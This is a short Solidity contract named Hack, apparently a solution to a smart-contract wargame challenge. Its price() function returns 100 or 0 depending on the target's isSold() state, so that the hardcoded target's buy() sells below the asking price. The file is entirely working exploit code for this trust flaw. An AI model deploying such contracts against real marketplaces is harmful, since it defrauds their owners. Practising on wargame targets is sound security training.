// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;



interface ITarget {
    function buy() external;
    function price() external view returns (uint256);
    function isSold() external view returns (bool);

}

interface Buyer {
    function price() external view returns (uint256);
}

contract Hack is Buyer{
    event Log(uint256);
    uint256 i = 0;
    ITarget  target = ITarget(0xDC17C27Ae8bE831AF07CC38C02930007060020F4);
    
    constructor() {

    }

    function price() external override view returns (uint256)   {
        if(target.isSold() == false) {
            return 100;
        }
        return 0;
    }



    function hack() public {
        target.buy();
    }
}